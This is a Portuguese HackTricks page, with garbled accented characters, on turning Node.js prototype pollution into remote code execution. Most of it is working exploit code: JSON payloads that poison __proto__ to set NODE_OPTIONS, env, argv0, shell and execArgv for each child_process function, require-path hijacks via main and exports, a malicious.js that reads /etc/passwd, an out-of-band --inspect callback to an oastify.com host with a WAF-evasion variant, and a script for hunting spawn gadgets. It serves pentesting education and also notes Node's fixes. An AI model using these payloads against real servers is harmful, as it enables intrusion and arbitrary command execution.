# Polui√ß√£o de Prot√≥tipo para RCE

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## C√≥digo Vulner√°vel

Imagine um c√≥digo JS real usando algo como o seguinte:
```javascript
const { execSync, fork } = require('child_process');

function isObject(obj) {
    console.log(typeof obj);
    return typeof obj === 'function' || typeof obj === 'object';
}

// Function vulnerable to prototype pollution
function merge(target, source) {
    for (let key in source) {
        if (isObject(target[key]) && isObject(source[key])) {
            merge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}

function clone(target) {
    return merge({}, target);
}

// Run prototype pollution with user input
// Check in the next sections what payload put here to execute arbitrary code
clone(USERINPUT);

// Spawn process, this will call the gadget that poputales env variables
// Create an a_file.js file in the current dir: `echo a=2 > a_file.js`
var proc = fork('a_file.js');
```
## PP2RCE via vari√°veis de ambiente

**PP2RCE** significa **Prototype Pollution to RCE** (Execu√ß√£o Remota de C√≥digo).

De acordo com este [**artigo**](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/), quando um **processo √© iniciado** com algum m√©todo do **`child_process`** (como `fork` ou `spawn` ou outros), ele chama o m√©todo `normalizeSpawnArguments`, que √© um **gadget de polui√ß√£o de prot√≥tipo para criar novas vari√°veis de ambiente**:
```javascript
//See code in https://github.com/nodejs/node/blob/02aa8c22c26220e16616a88370d111c0229efe5e/lib/child_process.js#L638-L686

var env = options.env || process.env;
var envPairs = [];
[...]
let envKeys = [];
// Prototype values are intentionally included.
for (const key in env) {
  ArrayPrototypePush(envKeys, key);
}
[...]
for (const key of envKeys) {
  const value = env[key];
  if (value !== undefined) {
    ArrayPrototypePush(envPairs, `${key}=${value}`); // <-- Pollution
  }
}
```
Verifique esse c√≥digo, voc√™ pode ver que √© poss√≠vel **envenenar `envPairs`** apenas **poluindo** o **atributo `.env`.**

### **Envenenando `__proto__`**

{% hint style="warning" %}
Observe que devido √† forma como a fun√ß√£o **`normalizeSpawnArguments`** da biblioteca **`child_process`** do node funciona, quando algo √© chamado para **definir uma nova vari√°vel de ambiente** para o processo, voc√™ s√≥ precisa **poluir qualquer coisa**.\
Por exemplo, se voc√™ fizer `__proto__.avar="valuevar"`, o processo ser√° iniciado com uma vari√°vel chamada `avar` com valor `valuevar`.

No entanto, para que a **vari√°vel de ambiente seja a primeira**, voc√™ precisa **poluir** o **atributo `.env`** e (apenas em alguns m√©todos) essa vari√°vel ser√° a **primeira** (permitindo o ataque).

√â por isso que **`NODE_OPTIONS`** n√£o est√° dentro de `.env` no seguinte ataque.
{% endhint %}

{% code overflow="wrap" %}
```javascript
const { execSync, fork } = require('child_process');

// Manual Pollution
b = {}
b.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/pp2rce').toString())//"}
b.__proto__.NODE_OPTIONS = "--require /proc/self/environ"

// Trigger gadget
var proc = fork('./a_file.js');
// This should create the file /tmp/pp2rec


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"__proto__": {"NODE_OPTIONS": "--require /proc/self/environ", "env": { "EVIL":"console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce\\\").toString())//"}}}')

clone(USERINPUT);

var proc = fork('a_file.js');
// This should create the file /tmp/pp2rec
```
### Envenenando `constructor.prototype`

{% endcode %}
```javascript
const { execSync, fork } = require('child_process');

// Manual Pollution
b = {}
b.constructor.prototype.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/pp2rce2').toString())//"}
b.constructor.prototype.NODE_OPTIONS = "--require /proc/self/environ"

proc = fork('a_file.js');
// This should create the file /tmp/pp2rec2


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"constructor": {"prototype": {"NODE_OPTIONS": "--require /proc/self/environ", "env": { "EVIL":"console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce2\\\").toString())//"}}}}')

clone(USERINPUT);

var proc = fork('a_file.js');
// This should create the file /tmp/pp2rec2
```
## PP2RCE via vari√°veis de ambiente + linha de comando

Uma carga √∫til semelhante √† anterior com algumas altera√ß√µes foi proposta neste [**artigo**](https://blog.sonarsource.com/blitzjs-prototype-pollution/)**.** As principais diferen√ßas s√£o:

* Em vez de armazenar a **carga √∫til** do nodejs dentro do arquivo `/proc/self/environ`, ela √© armazenada dentro de **argv0** de **`/proc/self/cmdline`**.
* Em seguida, em vez de exigir via **`NODE_OPTIONS`** o arquivo `/proc/self/environ`, ele **exige `/proc/self/cmdline`**.
```javascript
const { execSync, fork } = require('child_process');

// Manual Pollution
b = {}
b.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/pp2rce2').toString())//"
b.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"

// Trigger gadget
var proc = fork('./a_file.js');
// This should create the file /tmp/pp2rec2


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"__proto__": {"NODE_OPTIONS": "--require /proc/self/cmdline", "argv0": "console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce2\\\").toString())//"}}')

clone(USERINPUT);

var proc = fork('a_file.js');
// This should create the file /tmp/pp2rec
```
{% endcode %}

## Intera√ß√£o DNS

Usando os seguintes payloads, √© poss√≠vel abusar da vari√°vel de ambiente NODE\_OPTIONS que discutimos anteriormente e detectar se funcionou com uma intera√ß√£o DNS:
```json
{
  "__proto__": {
    "argv0":"node",
    "shell":"node",
    "NODE_OPTIONS":"--inspect=id.oastify.com"
  }
}
```
Ou, para evitar WAFs que pedem o dom√≠nio:
```json
{
  "__proto__": {
    "argv0":"node",
    "shell":"node",
    "NODE_OPTIONS":"--inspect=id\"\".oastify\"\".com"
  }
}
```
## Vulnerabilidade PP2RCE nas fun√ß√µes child\_process

Nesta se√ß√£o, vamos analisar **cada fun√ß√£o de `child_process`** para executar c√≥digo e ver se podemos usar alguma t√©cnica para for√ßar essa fun√ß√£o a executar c√≥digo:

<details>

<summary>Explora√ß√£o de <code>exec</code></summary>

{% code overflow="wrap" %}
```javascript
// environ trick - not working
// It's not possible to pollute the .env attr to create a first env var
// because options.env is null (not undefined)

// cmdline trick - working with small variation
// Working after kEmptyObject (fix)
const { exec } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/exec-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = exec('something');

// stdin trick - not working
// Not using stdin

// Windows
// Working after kEmptyObject (fix)
const { exec } = require('child_process');
p = {}
p.__proto__.shell = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = exec('something');
```
</details>

<details>

<summary><strong>Explora√ß√£o de <code>execFile</code></strong></summary>
```javascript
// environ trick - not working
// It's not possible to pollute the .en attr to create a first env var

// cmdline trick - working with a big requirement
// Working after kEmptyObject (fix)
const { execFile } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/execFile-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = execFile('/usr/bin/node');

// stdin trick - not working
// Not using stdin

// Windows - not working
```
Para que o **`execFile`** funcione, **DEVE executar o node** para que as NODE\_OPTIONS funcionem.\
Se **n√£o** estiver executando **node**, voc√™ precisa descobrir como poderia **alterar a execu√ß√£o** do que est√° sendo executado **com vari√°veis de ambiente** e defini-las.

As **outras** t√©cnicas **funcionam** sem esse requisito porque √© **poss√≠vel modificar** **o que √© executado** por meio da polui√ß√£o de prot√≥tipos. (Nesse caso, mesmo que voc√™ possa poluir `.shell`, voc√™ n√£o poluir√° o que est√° sendo executado).

</details>

<details>

<summary>Explora√ß√£o de <code>fork</code></summary>

{% code overflow="wrap" %}
```javascript
// environ trick - working
// Working after kEmptyObject (fix)
const { fork } = require('child_process');
b = {}
b.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/fork-environ').toString())//"}
b.__proto__.NODE_OPTIONS = "--require /proc/self/environ"
var proc = fork('something');

// cmdline trick - working
// Working after kEmptyObject (fix)
const { fork } = require('child_process');
p = {}
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/fork-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = fork('something');

// stdin trick - not working
// Not using stdin

// execArgv trick - working
// Only the fork method has this attribute
// Working after kEmptyObject (fix)
const { fork } = require('child_process');
b = {}
b.__proto__.execPath = "/bin/sh"
b.__proto__.argv0 = "/bin/sh"
b.__proto__.execArgv = ["-c", "touch /tmp/fork-execArgv"]
var proc = fork('./a_file.js');

// Windows
// Working after kEmptyObject (fix)
const { fork } = require('child_process');
b = {}
b.__proto__.execPath = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = fork('./a_file.js');
```
{% endcode %}

</details>

<details>

<summary><strong>Explora√ß√£o de <code>spawn</code></strong></summary>

{% code overflow="wrap" %}
```javascript
// environ trick - working with small variation (shell and argv0)
// NOT working after kEmptyObject (fix) without options
const { spawn } = require('child_process');
p = {}
// If in windows or mac you need to change the following params to the path of ndoe
p.__proto__.argv0 = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/spawn-environ').toString())//"}
p.__proto__.NODE_OPTIONS = "--require /proc/self/environ"
var proc = spawn('something');
//var proc = spawn('something',[],{"cwd":"/tmp"}); //To work after kEmptyObject (fix)


// cmdline trick - working with small variation (shell)
// NOT working after kEmptyObject (fix) without options
const { spawn } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/spawn-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = spawn('something');
//var proc = spawn('something',[],{"cwd":"/tmp"}); //To work after kEmptyObject (fix)


// stdin trick - not working
// Not using stdin

// Windows
// NOT working after require(fix) without options
const { spawn } = require('child_process');
p = {}
p.__proto__.shell = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = spawn('something');
//var proc = spawn('something',[],{"cwd":"C:\\"}); //To work after kEmptyObject (fix)
```
{% endcode %}

</details>

<details>

<summary><strong>Explora√ß√£o do <code>execFileSync</code></strong></summary>

{% code overflow="wrap" %}
```javascript
// environ trick - working with small variation (shell and argv0)
// Working after kEmptyObject (fix)
const { execFileSync } = require('child_process');
p = {}
// If in windows or mac you need to change the following params to the path of ndoe
p.__proto__.argv0 = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/execFileSync-environ').toString())//"}
p.__proto__.NODE_OPTIONS = "--require /proc/self/environ"
var proc = execFileSync('something');

// cmdline trick - working with small variation (shell)
// Working after kEmptyObject (fix)
const { execFileSync } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/execFileSync-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = execFileSync('something');

// stdin trick - working
// Working after kEmptyObject (fix)
const { execFileSync } = require('child_process');
p = {}
p.__proto__.argv0 = "/usr/bin/vim"
p.__proto__.shell = "/usr/bin/vim"
p.__proto__.input = ':!{touch /tmp/execFileSync-stdin}\n'
var proc = execFileSync('something');

// Windows
// Working after kEmptyObject (fix)
const { execSync } = require('child_process');
p = {}
p.__proto__.shell = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
p.__proto__.argv0 = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = execSync('something');
```
{% endcode %}

</details>

<details>

<summary><strong>Explora√ß√£o do <code>execSync</code></strong></summary>

{% code overflow="wrap" %}
```javascript
// environ trick - working with small variation (shell and argv0)
// Working after kEmptyObject (fix)
const { execSync } = require('child_process');
p = {}
// If in windows or mac you need to change the following params to the path of ndoe
p.__proto__.argv0 = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/execSync-environ').toString())//"}
p.__proto__.NODE_OPTIONS = "--require /proc/self/environ"
var proc = execSync('something');

// cmdline trick - working with small variation (shell)
// Working after kEmptyObject (fix)
const { execSync } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/execSync-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = execSync('something');

// stdin trick - working
// Working after kEmptyObject (fix)
const { execSync } = require('child_process');
p = {}
p.__proto__.argv0 = "/usr/bin/vim"
p.__proto__.shell = "/usr/bin/vim"
p.__proto__.input = ':!{touch /tmp/execSync-stdin}\n'
var proc = execSync('something');

// Windows
// Working after kEmptyObject (fix)
const { execSync } = require('child_process');
p = {}
p.__proto__.shell = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = execSync('something');
```
{% endcode %}

</details>

<details>

<summary><strong>Explora√ß√£o do <code>spawnSync</code></strong></summary>

{% code overflow="wrap" %}
```javascript
// environ trick - working with small variation (shell and argv0)
// NOT working after kEmptyObject (fix) without options
const { spawnSync } = require('child_process');
p = {}
// If in windows or mac you need to change the following params to the path of node
p.__proto__.argv0 = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/spawnSync-environ').toString())//"}
p.__proto__.NODE_OPTIONS = "--require /proc/self/environ"
var proc = spawnSync('something');
//var proc = spawnSync('something',[],{"cwd":"/tmp"}); //To work after kEmptyObject (fix)


// cmdline trick - working with small variation (shell)
// NOT working after kEmptyObject (fix) without options
const { spawnSync } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/spawnSync-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = spawnSync('something');
//var proc = spawnSync('something',[],{"cwd":"/tmp"}); //To work after kEmptyObject (fix)


// stdin trick - working
// NOT working after kEmptyObject (fix) without options
const { spawnSync } = require('child_process');
p = {}
p.__proto__.argv0 = "/usr/bin/vim"
p.__proto__.shell = "/usr/bin/vim"
p.__proto__.input = ':!{touch /tmp/spawnSync-stdin}\n'
var proc = spawnSync('something');
//var proc = spawnSync('something',[],{"cwd":"/tmp"}); //To work after kEmptyObject (fix)

// Windows
// NOT working after require(fix) without options
const { spawnSync } = require('child_process');
p = {}
p.__proto__.shell = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = spawnSync('something');
//var proc = spawnSync('something',[],{"cwd":"C:\\"}); //To work after kEmptyObject (fix)
```
{% endcode %}

</details>

## For√ßando Spawn

Nos exemplos anteriores, voc√™ viu como acionar o gadget que uma funcionalidade que **chama `spawn`** precisa estar **presente** (todos os m√©todos de **`child_process`** usados para executar algo a chamam). No exemplo anterior, isso fazia **parte do c√≥digo**, mas e se o c√≥digo **n√£o estiver** chamando isso.

### Controlando um caminho de arquivo require

Neste [**outro artigo**](https://blog.sonarsource.com/blitzjs-prototype-pollution/), o usu√°rio pode controlar o caminho do arquivo onde um **`require`** ser√° executado. Nesse cen√°rio, o atacante s√≥ precisa **encontrar um arquivo `.js` dentro do sistema** que ir√° **executar um m√©todo spawn quando importado.**\
Alguns exemplos de arquivos comuns que chamam uma fun√ß√£o spawn quando importados s√£o:

* /path/to/npm/scripts/changelog.js
* /opt/yarn-v1.22.19/preinstall.js
* Encontre **mais arquivos abaixo**

O seguinte script simples procurar√° por **chamadas** de **child\_process** **sem nenhum preenchimento** (para evitar mostrar chamadas dentro de fun√ß√µes): 

{% code overflow="wrap" %}
```bash
find / -name "*.js" -type f -exec grep -l "child_process" {} \; 2>/dev/null | while read file_path; do
    grep --with-filename -nE "^[a-zA-Z].*(exec\(|execFile\(|fork\(|spawn\(|execFileSync\(|execSync\(|spawnSync\()" "$file_path" | grep -v "require(" | grep -v "function " | grep -v "util.deprecate" | sed -E 's/.{255,}.*//'
done
# Note that this way of finding child_process executions just importing might not find valid scripts as functions called in the root containing child_process calls won't be found.
```
{% endcode %}

<details>

<summary>Arquivos interessantes encontrados pelo script anterior</summary>

* node\_modules/buffer/bin/**download-node-tests.js**:17:`cp.execSync('rm -rf node/*.js', { cwd: path.join(__dirname, '../test') })`
* node\_modules/buffer/bin/**test.js**:10:`var node = cp.spawn('npm', ['run', 'test-node'], { stdio: 'inherit' })`
* node\_modules/npm/scripts/**changelog.js**:16:`const log = execSync(git log --reverse --pretty='format:%h %H%d %s (%aN)%n%b%n---%n' ${branch}...).toString().split(/\n/)`
* node\_modules/detect-libc/bin/**detect-libc.js**:18:`process.exit(spawnSync(process.argv[2], process.argv.slice(3), spawnOptions).status);`
* node\_modules/jest-expo/bin/**jest.js**:26:`const result = childProcess.spawnSync('node', jestWithArgs, { stdio: 'inherit' });`
* node\_modules/buffer/bin/**download-node-tests.js**:17:`cp.execSync('rm -rf node/*.js', { cwd: path.join(__dirname, '../test') })`
* node\_modules/buffer/bin/**test.js**:10:`var node = cp.spawn('npm', ['run', 'test-node'], { stdio: 'inherit' })`
* node\_modules/runtypes/scripts/**format.js**:13:`const npmBinPath = execSync('npm bin').toString().trim();`
* node\_modules/node-pty/scripts/**publish.js**:31:`const result = cp.spawn('npm', args, { stdio: 'inherit' });`

</details>

### Definindo o caminho do arquivo require via prototype pollution

{% hint style="warning" %}
A **t√©cnica anterior requer** que o **usu√°rio controle o caminho do arquivo** que ser√° **requerido**. Mas isso nem sempre √© verdade.
{% endhint %}

No entanto, se o c√≥digo for executar um require ap√≥s a polui√ß√£o do prototype, mesmo que voc√™ **n√£o controle o caminho** que ser√° requerido, voc√™ **pode for√ßar um diferente abusando da propotype pollution**. Portanto, mesmo que a linha de c√≥digo seja como `require("./a_file.js")` ou `require("bytes")`, ela ir√° **requerer o pacote que voc√™ poluiu**.

Portanto, se um require for executado ap√≥s a polui√ß√£o do seu prototype e n√£o houver uma fun√ß√£o spawn, este √© o ataque:

* Encontre um **arquivo `.js` dentro do sistema** que, quando **requerido**, ir√° **executar algo usando `child_process`**
  * Se voc√™ puder fazer upload de arquivos na plataforma que est√° atacando, poder√° fazer upload de um arquivo assim
* Polua os caminhos para **for√ßar o require a carregar o arquivo `.js`** que ir√° executar algo com child\_process
* **Polua o environ/cmdline** para executar c√≥digo arbitr√°rio quando uma fun√ß√£o de execu√ß√£o de child\_process √© chamada (veja as t√©cnicas iniciais)

#### Require absoluto

Se o require executado for **absoluto** (`require("bytes")`) e o **pacote n√£o contiver main** no arquivo `package.json`, voc√™ pode **poluir o atributo `main`** e fazer o **require executar um arquivo diferente**.

{% tabs %}
{% tab title="exploit" %}
{% code overflow="wrap" %}
```javascript
// Create a file called malicious.js in /tmp
// Contents of malicious.js in the other tab

// Install package bytes (it doesn't have a main in package.json)
// npm install bytes

// Manual Pollution
b = {}
b.__proto__.main = "/tmp/malicious.js"

// Trigger gadget
var proc = require('bytes');
// This should execute the file /tmp/malicious.js
// The relative path doesn't even need to exist


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"__proto__": {"main": "/tmp/malicious.js", "NODE_OPTIONS": "--require /proc/self/cmdline", "argv0": "console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce_absolute\\\").toString())//"}}')

clone(USERINPUT);

var proc = require('bytes');
// This should execute the file /tmp/malicious.js wich create the file /tmp/pp2rec
```
{% endcode %}
{% endtab %}

{% tab title="malicious.js" %}

```javascript
const { exec } = require('child_process');

exec('cat /etc/passwd', (err, stdout, stderr) => {
  console.log(stdout);
});
```

{% endtab %}

{% endtabs %}

O c√≥digo acima √© um exemplo de como um atacante pode explorar a vulnerabilidade de polui√ß√£o de prot√≥tipo para executar comandos maliciosos em um servidor Node.js. O atacante pode injetar c√≥digo malicioso no objeto `Object.prototype` e, em seguida, manipular o objeto para executar comandos no servidor. Neste exemplo, o atacante est√° executando o comando `cat /etc/passwd` para exibir o arquivo de senhas do sistema. √â importante lembrar que essa t√©cnica pode ser usada para executar qualquer comando no servidor, portanto, √© uma vulnerabilidade cr√≠tica que deve ser corrigida imediatamente.
```javascript
const { fork } = require('child_process');
console.log("Hellooo from malicious");
fork("anything");
```
#### Require relativo - 1

Se um **caminho relativo** √© carregado em vez de um caminho absoluto, voc√™ pode fazer o node **carregar um caminho diferente**:

{% tabs %}
{% tab title="exploit" %}
{% code overflow="wrap" %}
```javascript
// Create a file called malicious.js in /tmp
// Contents of malicious.js in the other tab

// Manual Pollution
b = {}
b.__proto__.exports = { ".": "./malicious.js" }
b.__proto__["1"] = "/tmp"

// Trigger gadget
var proc = require('./relative_path.js');
// This should execute the file /tmp/malicious.js
// The relative path doesn't even need to exist


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"__proto__": {"exports": {".": "./malicious.js"}, "1": "/tmp", "NODE_OPTIONS": "--require /proc/self/cmdline", "argv0": "console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce_exports_1\\\").toString())//"}}')

clone(USERINPUT);

var proc = require('./relative_path.js');
// This should execute the file /tmp/malicious.js wich create the file /tmp/pp2rec
```
{% endcode %}
{% endtab %}

{% tab title="malicious.js" %}

```javascript
const { exec } = require('child_process');

exec('cat /etc/passwd', (err, stdout, stderr) => {
  console.log(stdout);
});
```

{% endtab %}

{% endtabs %}

O c√≥digo acima √© um exemplo de como um atacante pode explorar a vulnerabilidade de polui√ß√£o de prot√≥tipo para executar comandos maliciosos em um servidor Node.js. O atacante pode injetar c√≥digo malicioso no objeto `Object.prototype` e, em seguida, manipular o objeto para executar comandos no servidor. Neste exemplo, o atacante est√° executando o comando `cat /etc/passwd` para exibir o arquivo de senhas do sistema. √â importante lembrar que essa t√©cnica pode ser usada para executar qualquer comando no servidor, incluindo comandos que podem comprometer completamente o sistema.
```javascript
const { fork } = require('child_process');
console.log("Hellooo from malicious");
fork('/path/to/anything');
```
#### Require relativo - 2

{% tabs %}
{% tab title="exploit" %}
{% code overflow="wrap" %}
```javascript
// Create a file called malicious.js in /tmp
// Contents of malicious.js in the other tab

// Manual Pollution
b = {}
b.__proto__.data = {}
b.__proto__.data.exports = { ".": "./malicious.js" }
b.__proto__.path = "/tmp"
b.__proto__.name = "./relative_path.js" //This needs to be the relative path that will be imported in the require

// Trigger gadget
var proc = require('./relative_path.js');
// This should execute the file /tmp/malicious.js
// The relative path doesn't even need to exist


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"__proto__": {"data": {"exports": {".": "./malicious.js"}}, "path": "/tmp", "name": "./relative_path.js", "NODE_OPTIONS": "--require /proc/self/cmdline", "argv0": "console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce_exports_path\\\").toString())//"}}')

clone(USERINPUT);

var proc = require('./relative_path.js');
// This should execute the file /tmp/malicious.js wich create the file /tmp/pp2rec
```
{% endcode %}
{% endtab %}

{% tab title="malicious.js" %}

```javascript
const { exec } = require('child_process');

exec('cat /etc/passwd', (err, stdout, stderr) => {
  console.log(stdout);
});
```

{% endtab %}

{% endtabs %}

O c√≥digo acima √© um exemplo de como um atacante pode explorar a vulnerabilidade de polui√ß√£o de prot√≥tipo para executar comandos maliciosos em um servidor Node.js. O atacante pode injetar c√≥digo malicioso no objeto `Object.prototype` que ser√° executado pelo servidor. Isso pode levar a um ataque de execu√ß√£o remota de c√≥digo (RCE) se o atacante puder controlar o objeto injetado. Para evitar essa vulnerabilidade, √© importante validar e sanitizar todas as entradas de usu√°rio e evitar o uso de objetos compartilhados em todo o aplicativo.
```javascript
const { fork } = require('child_process');
console.log("Hellooo from malicious");
fork('/path/to/anything');
```
## Gadgets de VM

No artigo [https://arxiv.org/pdf/2207.11171.pdf](https://arxiv.org/pdf/2207.11171.pdf), tamb√©m √© indicado que o controle de **`contextExtensions`** de alguns m√©todos da biblioteca **`vm`** poderia ser usado como um gadget.\
No entanto, assim como os m√©todos anteriores de **`child_process`**, ele foi **corrigido** nas vers√µes mais recentes.

## Corre√ß√µes e prote√ß√µes inesperadas

Por favor, note que a polui√ß√£o de prot√≥tipos funciona se o **atributo** de um objeto que est√° sendo acessado √© **indefinido**. Se no **c√≥digo** esse **atributo** for **definido** com um **valor**, voc√™ **n√£o poder√° sobrescrev√™-lo**.

Em junho de 2022, a partir [**deste commit**](https://github.com/nodejs/node/commit/20b0df1d1eba957ea30ba618528debbe02a97c6a), a vari√°vel `options`, em vez de `{}`, √© um **`kEmptyObject`**. Isso **impede que a polui√ß√£o de prot√≥tipos** afete os **atributos** de **`options`** para obter RCE.\
Pelo menos a partir da v18.4.0, essa prote√ß√£o foi **implementada**, e portanto os **exploits** `spawn` e `spawnSync` que afetam os m√©todos **n√£o funcionam mais** (se nenhum `options` for usado!).

No [**commit**](https://github.com/nodejs/node/commit/0313102aaabb49f78156cadc1b3492eac3941dd9) a polui√ß√£o de prot√≥tipos de **`contextExtensions`** da biblioteca vm foi **tamb√©m corrigida** definindo as op√ß√µes como \*\*`kEmptyObject` \*\* em vez de **`{}`.**

## Refer√™ncias

* [https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
* [https://blog.sonarsource.com/blitzjs-prototype-pollution/](https://blog.sonarsource.com/blitzjs-prototype-pollution/)
* [https://arxiv.org/pdf/2207.11171.pdf](https://arxiv.org/pdf/2207.11171.pdf)
* [https://portswigger.net/research/server-side-prototype-pollution](https://portswigger.net/research/server-side-prototype-pollution)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
